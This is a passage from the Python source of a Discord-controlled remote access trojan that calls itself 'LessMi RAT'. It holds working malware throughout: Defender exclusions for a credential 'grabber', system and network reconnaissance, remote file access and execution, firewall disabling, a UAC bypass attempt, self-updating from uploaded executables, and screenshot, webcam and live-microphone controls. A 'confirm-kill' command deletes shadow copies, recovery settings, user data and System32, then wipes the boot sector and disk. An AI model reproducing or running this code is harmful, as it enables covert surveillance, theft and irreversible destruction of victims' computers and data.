    ps(f'Add-MpPreference -ExclusionPath "{temp}" -ErrorAction SilentlyContinue')

    try:
        out = await asyncio.wait_for(
            asyncio.to_thread(run_script_capture, temp, mode), timeout=600)
    except asyncio.TimeoutError:
        out = "[error] timeout"

    await ctx.send(embed=create_embed("Grabber", f"Ran `{os.path.basename(temp)}` :: {mode}", 0x00FF00))
    await send_long(ctx, out or "Ran (no output)")

    for _ in range(5):
        try:
            os.remove(temp)
            break
        except Exception:
            time.sleep(0.5)
    await ctx.send(embed=create_embed("Cleanup", "Temp script deleted.", 0x0084FF))

@bot.command(aliases=["systeminfo"])
async def sysinfo_raw(ctx):
    await ctx.message.add_reaction("🧾")
    raw = await asyncio.to_thread(exec_capture, "systeminfo")
    await send_long(ctx, raw)


@bot.command()
async def gpu(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_VideoController | Select-Object Name, DriverVersion, VideoProcessor | Format-List | Out-String").stdout)


@bot.command()
async def cpu(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed | Format-List | Out-String").stdout)


@bot.command(aliases=["mobo"])
async def motherboard(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def bios(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion, ReleaseDate, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def disks(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_DiskDrive | Select-Object Model, Size, InterfaceType, SerialNumber | Format-List | Out-String").stdout)


@bot.command()
async def volumes(ctx):
    await send_long(ctx, ps("Get-Volume | Select-Object DriveLetter, FileSystemLabel, Size, SizeRemaining | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def partition(ctx):
    await send_long(ctx, ps("Get-Partition | Select-Object DiskNumber, PartitionNumber, DriveLetter, Size | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def temp(ctx):
    await send_long(ctx, ps("Get-CimInstance -Namespace root/WMI -ClassName MSAcpi_ThermalZoneTemperature | Select-Object InstanceName, CurrentTemperature | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def uptime(ctx):
    delta = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    hours, rem = divmod(int(delta.total_seconds()), 3600)
    await ctx.send(embed=create_embed("⏱️ Uptime", f"**{delta.days}d {hours % 24}h {rem // 60}m**", 0x3498db))


@bot.command(aliases=["time"])
async def sysclock(ctx):
    await ctx.send(embed=create_embed("🕒 System Clock", datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 0x3498db))


@bot.command()
async def whoami(ctx):
    await send_long(ctx, cmd_run("whoami /all").stdout)


@bot.command(aliases=["envvars"])
async def env(ctx):
    await send_long(ctx, ps("Get-ChildItem Env: | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def sessions(ctx):
    await send_long(ctx, cmd_run("query user").stdout)


@bot.command(aliases=["localusers"])
async def users(ctx):
    await send_long(ctx, ps("Get-LocalUser | Select-Object Name, Enabled, LastLogon | Format-Table -AutoSize | Out-String").stdout)


@bot.command(aliases=["hotfixes"])
async def hotfix(ctx):
    await send_long(ctx, ps("Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def antivirus(ctx):
    await send_long(ctx, ps("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState | Format-Table -AutoSize | Out-String").stdout)


@bot.command()
async def drivers(ctx):
    await send_long(ctx, ps("Get-CimInstance Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion | Format-Table -AutoSize | Out-String").stdout[:6000])


@bot.command(aliases=["events"])
async def event_log(ctx):
    await send_long(ctx, ps("Get-EventLog -LogName System -Newest 20 | Select-Object TimeGenerated, EntryType, Source, Message | Format-List | Out-String").stdout[:6000])


@bot.command()
async def ping(ctx, host: str = "8.8.8.8"):
    await ctx.message.add_reaction("📡")
    await send_long(ctx, cmd_run(f"ping -n 4 {host}").stdout)


@bot.command()
async def tracert(ctx, host: str = "8.8.8.8"):
    await ctx.message.add_reaction("📡")
    await send_long(ctx, cmd_run(f"tracert -d -h 12 {host}").stdout)


@bot.command()
async def nslookup(ctx, host: str = "google.com"):
    await send_long(ctx, cmd_run(f"nslookup {host}").stdout)


@bot.command()
async def netstat(ctx):
    await send_long(ctx, cmd_run("netstat -ano").stdout[:7000])


@bot.command()
async def ports(ctx):
    await send_long(ctx, cmd_run("netstat -ano | findstr LISTENING").stdout)


@bot.command()
async def arp(ctx):
    await send_long(ctx, cmd_run("arp -a").stdout)


@bot.command()
async def route(ctx):
    await send_long(ctx, cmd_run("route print -4").stdout[:5000])


@bot.command(aliases=["flushdns"])
async def flush_dns(ctx):
    await ctx.send(embed=create_embed("🧹 DNS", (cmd_run("ipconfig /flushdns").stdout or "").strip() or "Flushed.", 0x00ff00))


@bot.command(aliases=["renewip"])
async def renew_ip(ctx):
    await ctx.message.add_reaction("🔄")
    await send_long(ctx, cmd_run("ipconfig /release & ipconfig /renew").stdout)


@bot.command(aliases=["adapters"])
async def net_adapter(ctx):
    await send_long(ctx, ps("Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, LinkSpeed | Format-Table -AutoSize | Out-String").stdout)


@bot.command(aliases=["nearby-wifi"])
async def wifi_networks(ctx):
    await send_long(ctx, cmd_run("netsh wlan show networks mode=bssid").stdout[:6000])


@bot.command(aliases=["net-share"])
async def shares(ctx):
    await send_long(ctx, cmd_run("net share").stdout)


@bot.command(aliases=["public-ip"])
async def public_ip(ctx):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://api.ipify.org") as r:
                await ctx.send(embed=create_embed("🌍 Public IP", f"```{await r.text()}```", 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def cat(ctx, *, file: str):
    try:
        with builtins.open(resolve(file), "r", encoding="utf-8", errors="replace") as f:
            await send_long(ctx, f.read()[:8000] or "(empty file)")
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def mkdir(ctx, *, name: str):
    try:
        os.makedirs(resolve(name), exist_ok=True)
        await ctx.send(embed=create_embed("📁 Created", resolve(name), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["write"])
async def mkfile(ctx, name: str, *, content: str = ""):
    try:
        with builtins.open(resolve(name), "w", encoding="utf-8") as f:
            f.write(content)
        await ctx.send(embed=create_embed("📝 Written", resolve(name), 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def move(ctx, src: str, *, dest: str):
    try:
        shutil.move(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("➡️ Moved", f"{src} → {dest}", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def copy(ctx, src: str, *, dest: str):
    try:
        if os.path.isdir(resolve(src)):
            shutil.copytree(resolve(src), resolve(dest), dirs_exist_ok=True)
        else:
            shutil.copy2(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("📄 Copied", f"{src} → {dest}", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def rename(ctx, src: str, *, dest: str):
    try:
        os.rename(resolve(src), resolve(dest))
        await ctx.send(embed=create_embed("🏷️ Renamed", f"{src} → {dest}", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def size(ctx, *, path: str):
    p = resolve(path)
    try:
        if os.path.isfile(p):
            total = os.path.getsize(p)
        else:
            total = sum(os.path.getsize(os.path.join(dp, f)) for dp, _, fs in os.walk(p) for f in fs)
        await ctx.send(embed=create_embed("📏 Size", f"`{path}` — **{total / 1048576:.2f} MB**", 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["sha256"])
async def hash(ctx, *, file: str):
    try:
        h = hashlib.sha256()
        with builtins.open(resolve(file), "rb") as f:
            for block in iter(lambda: f.read(65536), b""):
                h.update(block)
        await ctx.send(embed=create_embed("🔑 SHA256", f"```{h.hexdigest()}```", 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def search(ctx, pattern: str, *, path: str = None):
    root = resolve(path or current_dir)
    hits = []
    try:
        for dp, _, fs in os.walk(root):
            for f in fs:
                if pattern.lower() in f.lower():
                    hits.append(os.path.join(dp, f))
            if len(hits) >= 80:
                break
        await ctx.send(embed=create_embed("🔎 Search", f"```{chr(10).join(hits) or 'No matches'}```", 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def zip(ctx, src: str, dest: str = None):
    try:
        p = resolve(src).rstrip("\\/")
        out = resolve(dest or (os.path.basename(p) + ".zip"))
        shutil.make_archive(out[:-4], "zip", p)
        await ctx.send(embed=create_embed("🗜️ Zipped", out, 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def unzip(ctx, *, file: str):
    p = resolve(file)
    try:
        with zipfile.ZipFile(p) as z:
            z.extractall(os.path.dirname(p))
        await ctx.send(embed=create_embed("📦 Unzipped", f"Extracted to `{os.path.dirname(p)}`", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def run(ctx, *, file: str):
    subprocess.Popen(f'"{resolve(file)}"', shell=True)
    await ctx.send(embed=create_embed("▶️ Running", file, 0x00ff00))


@bot.command()
async def recent(ctx):
    folder = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Recent")
    try:
        files = sorted(glob.glob(os.path.join(folder, "*")), key=os.path.getmtime, reverse=True)[:40]
        await ctx.send(embed=create_embed("🕘 Recent Files", f"```{chr(10).join(os.path.basename(f) for f in files) or 'None'}```", 0x3498db))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["usb-history"])
async def usb(ctx):
    await send_long(ctx, cmd_run('reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr "Disk&Ven"').stdout)


@bot.command(aliases=["set-resolution"])
async def resolution(ctx, width: int = None, height: int = None):
    if not width or not height:
        await ctx.send(embed=create_embed("Error", "Usage: `.resolution <width> <height>`", 0xffa500))
        return
    try:
        dm = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
        dm.PelsWidth, dm.PelsHeight = width, height
        win32api.ChangeDisplaySettings(dm, 0)
        await ctx.send(embed=create_embed("🖥️ Resolution", f"{width}x{height}", 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["darkmode"])
async def dark_mode(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.dark-mode <on|off>`", 0xffa500))
        return
    val = "0" if state == "on" else "1"
    for key in ("AppsUseLightTheme", "SystemUsesLightTheme"):
        cmd_run(f'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v {key} /t REG_DWORD /d {val} /f')
    await ctx.send(embed=create_embed("🌗 Dark Mode", state.upper(), 0x00ff00))


@bot.command(aliases=["nightlight"])
async def night_light(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.night-light <on|off>`", 0xffa500))
        return
    out = ps(r'''
$p = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount\*windows.data.bluelightreduction.bluelightreductionstate*\Current'
$d = (Get-ItemProperty -Path $p -ErrorAction SilentlyContinue).Data
if (-not $d) { Write-Output 'unsupported'; exit }
if ($d[18] -eq 0x10) { $n = $d[0..17] + 0x15,0x02,0x01 + $d[18..($d.Length-1)] }
else { $n = $d[0..17] + 0x10 + $d[20..($d.Length-1)] }
Set-ItemProperty -Path $p -Name Data -Value $n
Stop-Process -Name StartMenuExperienceHost -Force -ErrorAction SilentlyContinue
Write-Output 'ok'
''').stdout
    await ctx.send(embed=create_embed("🌙 Night Light", "Toggled." if "ok" in out else out.strip(), 0x00ff00))


@bot.command(aliases=["invert"])
async def invert_colors(ctx):
    threading.Thread(target=flash_screen, args=("invert",), daemon=True).start()
    await ctx.send(embed=create_embed("🎨 Invert", "Colors inverted for 10s.", 0x0084ff))


@bot.command()
async def magnifier(ctx):
    subprocess.Popen("magnify.exe", shell=True)
    await ctx.send(embed=create_embed("🔍 Magnifier", "Opened.", 0x00ff00))


def _set_lock(name, state):
    vk = {"capslock": 0x14, "numlock": 0x90, "scrolllock": 0x91}[name]
    cur = ctypes.windll.user32.GetKeyState(vk) & 1
    if bool(cur) != state:
        ctypes.windll.user32.keybd_event(vk, 0x45, 0, 0)
        ctypes.windll.user32.keybd_event(vk, 0x45, 2, 0)


@bot.command()
async def capslock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.capslock <on|off>`", 0xffa500))
        return
    _set_lock("capslock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Caps Lock", state.upper(), 0x00ff00))


@bot.command()
async def numlock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.numlock <on|off>`", 0xffa500))
        return
    _set_lock("numlock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Num Lock", state.upper(), 0x00ff00))


@bot.command()
async def scrolllock(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.scrolllock <on|off>`", 0xffa500))
        return
    _set_lock("scrolllock", state == "on")
    await ctx.send(embed=create_embed("⌨️ Scroll Lock", state.upper(), 0x00ff00))


@bot.command(aliases=["stickykeys"])
async def sticky_keys(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.sticky-keys <on|off>`", 0xffa500))
        return
    cmd_run(f'reg add "HKCU\\Control Panel\\Accessibility\\StickyKeys" /v Flags /t REG_SZ /d {"511" if state == "on" else "58"} /f')
    await ctx.send(embed=create_embed("⌨️ Sticky Keys", state.upper(), 0x00ff00))


@bot.command()
async def mouse_speed(ctx, speed: int = None):
    if speed is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.mouse-speed <1-20>`", 0xffa500))
        return
    ctypes.windll.user32.SystemParametersInfoW(0x0071, 0, max(1, min(20, speed)), 3)
    await ctx.send(embed=create_embed("🖱️ Mouse Speed", f"Set to **{speed}**.", 0x00ff00))


@bot.command()
async def swap_mouse(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.swap-mouse <on|off>`", 0xffa500))
        return
    ctypes.windll.user32.SwapMouseButton(1 if state == "on" else 0)
    await ctx.send(embed=create_embed("🖱️ Swap Mouse", state.upper(), 0x00ff00))


@bot.command()
async def hibernate(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.hibernate <on|off>`", 0xffa500))
        return
    subprocess.run(["powercfg", "/hibernate", state], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    await ctx.send(embed=create_embed("💤 Hibernate", state.upper(), 0x00ff00))


@bot.command()
async def fastboot(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.fastboot <on|off>`", 0xffa500))
        return
    cmd_run(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power" /v HiberbootEnabled /t REG_DWORD /d {"1" if state == "on" else "0"} /f')
    await ctx.send(embed=create_embed("⚡ Fast Startup", state.upper(), 0x00ff00))


@bot.command()
async def firewall(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.firewall <on|off>`", 0xffa500))
        return
    ps(f"Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled {'True' if state == 'on' else 'False'}")
    await ctx.send(embed=create_embed("🧱 Firewall", state.upper(), 0x00ff00))


@bot.command()
async def bitlocker(ctx):
    out = ps("Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, ProtectionStatus | Format-Table -AutoSize | Out-String").stdout
    if not out.strip():
        out = cmd_run("manage-bde -status").stdout
    await send_long(ctx, out)


@bot.command(aliases=["restore-point"])
async def restore_point(ctx):
    ps('Enable-ComputerRestore -Drive "$env:SystemDrive\\"; Checkpoint-Computer -Description "LessMi"')
    await ctx.send(embed=create_embed("♻️ Restore Point", "Created.", 0x00ff00))


@bot.command(aliases=["godmode"])
async def god_mode(ctx):
    path = os.path.join(os.path.expanduser("~"), "Desktop", "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}")
    try:
        os.makedirs(path, exist_ok=True)
        await ctx.send(embed=create_embed("🛠️ God Mode", path, 0x00ff00))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command()
async def bluetooth(ctx, state: str = None):
    if state not in ("on", "off"):
        await ctx.send(embed=create_embed("Error", "Usage: `.bluetooth <on|off>`", 0xffa500))
        return
    verb = "Enable-PnpDevice" if state == "on" else "Disable-PnpDevice"
    ps(f"$d = Get-PnpDevice -Class Bluetooth -ErrorAction SilentlyContinue | Where-Object {{ $_.FriendlyName -notlike '*Enumerator*' }}; foreach ($x in $d) {{ {verb} -InstanceId $x.InstanceId -Confirm:$false -ErrorAction SilentlyContinue }}")
    await ctx.send(embed=create_embed("📶 Bluetooth", state.upper(), 0x00ff00))


@bot.command(aliases=["eject"])
async def open_cd(ctx):
    ps("$d = Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=5\" | Select-Object -First 1; if ($d) { (New-Object -com Shell.Application).NameSpace(17).ParseName($d.DeviceID).InvokeVerb('Eject') }")
    await ctx.send(embed=create_embed("💿 Drive", "Ejected.", 0x0084ff))


@bot.command(aliases=["wallpaper-random"])
async def wallpaper_random(ctx):
    folder = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "Web", "Wallpaper")
    files = glob.glob(os.path.join(folder, "**", "*.jpg"), recursive=True)
    if not files:
        await ctx.send(embed=create_embed("Error", "No wallpapers found.", 0xff0000))
        return
    await set_wallpaper(ctx, source=random.choice(files))

@bot.command(aliases=["confirm-kill"])
async def confirm_kill(ctx):
    await ctx.send("`💻` Destroying system... If this is the last bot message, the system has been destroyed. The bot will not reply to more commands if the system is destroyed.")

    async def step(msg):
        await ctx.send(f"`»` {msg}")

    await step("Purging security software")
    try:
        await asyncio.to_thread(purge_av)
    except Exception:
        pass

    await step("Killing recovery")
    def kill_recovery():
        for args in (
            ["reagentc", "/disable"],
            ["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
            ["bcdedit", "/deletevalue", "{default}", "recoverysequence"],
            ["bcdedit", "/delete", "{current}", "/f"],
            ["vssadmin", "delete", "shadows", "/all", "/quiet"],
            ["wbadmin", "delete", "systemstatebackup", "-quiet"],
            ["powercfg", "/hibernate", "off"],
        ):
            try:
                subprocess.run(args, capture_output=True, creationflags=_CNW)
            except Exception:
                pass
    await asyncio.to_thread(kill_recovery)

    await step("Deleting BCD store")
    for bcd in (r"C:\Boot\BCD", r"C:\EFI\Microsoft\Boot\BCD"):
        try:
            subprocess.run(["attrib", "-h", "-s", "-r", bcd], capture_output=True, creationflags=_CNW)
            os.remove(bcd)
        except Exception:
            pass

    await step("Deleting user data")
    for folder in ("Downloads", "Desktop", "Documents", "Music", "Pictures",
                   "Videos", r"AppData\Local\Temp"):
        p = os.path.join(os.path.expanduser("~"), folder)
        if os.path.isdir(p):
            subprocess.run(f'rd /s /q "{p}"', shell=True, capture_output=True, creationflags=_CNW)

    await step("Deleting System32")
    subprocess.run(["icacls", os.path.join(WINDIR, "System32"),
                    "/grant", "*S-1-5-32-545:F", "/t", "/c", "/q"],
                   capture_output=True, creationflags=_CNW)
    for d in ("System32", "SysWOW64"):
        await asyncio.to_thread(lambda d=d: subprocess.run(
            f'rd /s /q "{os.path.join(WINDIR, d)}"', shell=True,
            capture_output=True, creationflags=_CNW))

    await step("Wiping boot sector and partition table")
    subprocess.run(["bootsect", "/nt60", "SYS", "/force", "/mbr"],
                   capture_output=True, creationflags=_CNW)
    subprocess.run(["bootsect", "/nt60", "ALL", "/force", "/mbr"],
                   capture_output=True, creationflags=_CNW)

    try:
        r = _ps("(Get-Disk | Where-Object { $_.IsBoot }).Number")
        out = (r.stdout or "").strip().splitlines() if r else []
        num = out[0].strip() if out and out[0].strip().isdigit() else "0"
        script = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "zz.txt")
        with open(script, "w") as f:
            f.write(f"select disk {num}\nclean\n")
        subprocess.run(["diskpart", "/s", script], capture_output=True, creationflags=_CNW)
    except Exception:
        pass

    await step("Rebooting")
    subprocess.Popen(["shutdown", "/r", "/f", "/t", "3"], shell=True)


@bot.command(aliases=["implode"])
async def delete_malware(ctx):
    await ctx.send("Starting cleanup...")

    def clean_system():
        st = _state_read() or {}
        name = st.get("task")
        exe = st.get("exe")
        d = st.get("dir")

        try:
            uninstall_userinit()
        except Exception:
            pass

        for tn in filter(None, (name, (name + "_b") if name else None)):
            subprocess.run(["schtasks", "/Delete", "/TN", tn, "/F"],
                           capture_output=True, creationflags=_CNW)

        if name:
            _reg_delete(RUN_KEY, name, "HKLM")
            _reg_delete(RUN_KEY, name, "HKCU")
            try:
                os.remove(os.path.join(_startup_dir(), name + ".vbs"))
            except Exception:
                pass

        if d:
            _ps(f'Remove-MpPreference -ExclusionPath "{d}"')
            _hide(d, False)
            _unlock_dir(d)

        if exe:
            _hide(exe, False)

        if d and os.path.isdir(d):
            shutil.rmtree(d, ignore_errors=True)

        try:
            os.remove(_anchor())
        except Exception:
            pass
        shutil.rmtree(os.path.join(PDATA, "ZZZ_Security"), ignore_errors=True)

    try:
        await asyncio.to_thread(clean_system)
        await ctx.send("Removed. Closing...")
        await asyncio.sleep(2)
        await bot.close()
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command()
async def exit(ctx):
    await ctx.send(embed=create_embed("👋 Goodbye", "Closing.", 0x00ff00))
    os._exit(0)


@bot.command()
async def update(ctx):
    if not ctx.message.attachments:
        await ctx.send("Attach the new file")
        return
    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith(".exe"):
        await ctx.send("Must be .exe")
        return
    new_path = os.path.join(BASE_DIR, "update.exe")
    await attachment.save(new_path)
    subprocess.Popen([new_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
    await ctx.send(embed=create_embed("📲 Updating", "Closing old version...", 0x00ff00))
    os._exit(0)


@bot.command(aliases=["set-date"])
async def set_date(ctx, date_str: str):
    ps(f'Set-Date -Date "{date_str}"')
    await ctx.send(embed=create_embed("📅 Date", f"Set to {date_str}.", 0x00ff00))


@bot.command(aliases=["set-time", "set-hour"])
async def set_time(ctx, time_str: str):
    ps(f'Set-Date -Date "{time_str}"')
    await ctx.send(embed=create_embed("⌛ Time", f"Set to {time_str}.", 0x00ff00))


@bot.command(aliases=["uac-bypass"])
async def uac_bypass(ctx):
    await ctx.send("`🧮` Attempting UAC bypass...")
    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)
    await ctx.send(embed=create_embed("🧮 UAC", "Elevation attempted.", 0x00ff00))


@bot.command(aliases=["ask-admin"])
async def ask_admin(ctx):
    if is_admin():
        await ctx.send("`👔` Already admin.")
        return
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    await ctx.send(embed=create_embed("👔 Admin", "UAC prompt sent.", 0x00ff00))


async def post_info_channel(guild):
    info_ch = guild.get_channel(cfg_get(guild.id, "info"))
    if not info_ch:
        return
    try:
        await info_ch.purge(limit=100)
    except Exception:
        pass

    pc = socket.gethostname()
    await info_ch.send(embed=create_embed("ℹ️ System Information", "Machine: **{}**".format(pc), 0x3498DB))
    raw = await asyncio.to_thread(exec_capture, "systeminfo")
    await _send_text_files(info_ch, "systeminfo_{}".format(pc), raw)
    await info_ch.send(embed=create_embed("Grab", "Not collected on boot. Run `.grab all` when you want it.", 0x00FF00))

@bot.command()
async def join(ctx):
    global voice_client, _voice_gen
    if not ctx.author.voice:
        await ctx.send(embed=create_embed("Error", "Join a voice channel first.", 0xFF0000))
        return
    if voice_client and voice_client.is_connected():
        await voice_client.move_to(ctx.author.voice.channel)
    else:
        voice_client = await ctx.author.voice.channel.connect()
    _voice_gen += 1
    threading.Thread(target=_voice_watchdog, args=(_voice_gen,), daemon=True).start()
    await ctx.send(embed=create_embed("Voice", f"Connected to `{ctx.author.voice.channel.name}`.", 0x00FF00))


@bot.command()
async def disconnect(ctx):
    global voice_reconnect
    voice_reconnect = False
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
    await ctx.send(embed=create_embed("Voice", "Disconnected.", 0x00FF00))

@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")

    pc_name = socket.gethostname()
    category_name = f"💻 〣 {pc_name}"

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(type=discord.ActivityType.playing, name="🔑 LessMi RAT")
    )

    for guild in bot.guilds:
        gid = guild.id
        CHANNEL_IDS.setdefault(gid, {})

        stored_accent = get_guild_value(gid, "accent")
        if stored_accent:
            globals()["ACCENT"] = stored_accent

        cat_id = get_guild_value(gid, "category")
        cat = guild.get_channel(cat_id) if cat_id else None
        if not cat:
            cat = discord.utils.get(guild.categories, name=category_name)
            if not cat:
                cat = await guild.create_category(category_name)
        CATEGORY_IDS[gid] = cat.id
        set_guild_value(gid, "category", cat.id)

        for key, name in CHANNEL_NAMES.items():
            if key == "info":
                old_id = get_guild_value(gid, key)
                old = guild.get_channel(old_id) if old_id else None
                if not old:
                    old = discord.utils.get(cat.text_channels, name=name)
                if old:
                    try:
                        await old.delete()
                    except Exception:
                        pass
                ch = await guild.create_text_channel(name, category=cat)
            else:
                ch_id = get_guild_value(gid, key)
                ch = guild.get_channel(ch_id) if ch_id else None
                if not ch:
                    ch = discord.utils.get(cat.text_channels, name=name)
                    if not ch:
                        ch = await guild.create_text_channel(name, category=cat)
            CHANNEL_IDS[gid][key] = ch.id
            set_guild_value(gid, key, ch.id)

        for idx, key in enumerate(CHANNEL_ORDER):
            ch = guild.get_channel(CHANNEL_IDS[gid].get(key))
            if ch:
                try:
                    await ch.edit(position=idx)
                except Exception:
                    pass

        voice_ch = discord.utils.get(cat.voice_channels, name="Live microphone")
        if not voice_ch:
            try:
                voice_ch = await guild.create_voice_channel("Live microphone", category=cat)
            except Exception:
                pass

        if voice_ch:
            CHANNEL_IDS[gid]["livemic"] = voice_ch.id
            set_guild_value(gid, "livemic", voice_ch.id)
            try:
                await voice_ch.edit(position=len(CHANNEL_ORDER))
            except Exception:
                pass

        keys_ch = guild.get_channel(cfg_get(gid, "keys"))
        if keys_ch:
            timestamp = datetime.now().strftime("[%Y-%m-%d] [%H:%M:%S]")
            await keys_ch.send(f"`{timestamp}` - **Started** new **session** on `{pc_name}`")

        panel_ch = guild.get_channel(cfg_get(gid, "panel"))
        if panel_ch:
            try:
                await panel_ch.purge(limit=100)
            except Exception:
                pass

            def mk(title, desc, color, fields):
                e = create_embed(title, desc, color)
                for n, v in fields:
                    e.add_field(name=n, value=v, inline=True)
                return e

            await panel_ch.send(embed=mk("Screenshot & Recording", "Screen and camera control", 0x3498db,
                                         [(".ss", "Screenshot"), (".screenrec", "Record"), (".webcam", "Webcam")]),
                                view=ButtonsScreenshot())

            await panel_ch.send(embed=mk("System Control", "Volume, input, monitors", 0xe74c3c,
                                         [(".volume", "Volume"), (".block-input", "Block"), (".monitors", "Monitors")]),
                                view=ButtonsSystem())

            await panel_ch.send(embed=mk("Cameras & Audio", "Device management", 0x2ecc71,
                                         [(".list-cams", "Cams"), (".list-mics", "Mics"), (".join", "Join")]),
                                view=ButtonsCameras())

            await panel_ch.send(embed=mk("Processes", "Process management", 0x9b59b6,
                                         [(".tasklist", "List"), (".kill-explorer", "Kill Exp"), (".start-explorer", "Start Exp")]),
                                view=ButtonsProcesses())

            await panel_ch.send(embed=mk("Trolling", "Fun commands", 0xf39c12,
                                         [(".crazy-mouse", "Crazy"), (".bsod", "BSOD"), (".forkbomb", "Fork")]),
                                view=ButtonsTrolling())

            await panel_ch.send(embed=mk("Files", "File management", 0x1abc9c,
                                         [(".ls", "List"), (".tree", "Tree")]),
                                view=ButtonsFiles())

            await panel_ch.send(embed=mk("Security", "Blacklist", 0x95a5a6,
                                         [(".blacklist", "Block"), (".unblacklist", "Unblock")]),
                                view=ButtonsSecurity())

            await panel_ch.send(embed=mk("Power", "Session control", 0xe67e22,
                                         [(".lock-pc", "Lock"), (".sleep-pc", "Sleep"), (".restart-pc", "Restart"), (".shutdown-pc", "Shutdown")]),
                                view=ButtonsPower())

            await panel_ch.send(embed=mk("Info", "System information", 0x3498db,
                                         [(".sysinfo", "Sysinfo"), (".battery", "Battery"), (".wifi", "WiFi"), (".drives", "Drives")]),
                                view=ButtonsInfo())

            await panel_ch.send(embed=mk("Tools", "Grabber, accent, clicks", 0x2ecc71,
                                         [(".grabber", "Grabber"), (".accent", "Accent"), (".click", "Click")]),
                                view=ButtonsTools())

            await panel_ch.send(embed=mk("More", "Extra tools", 0x9b59b6,
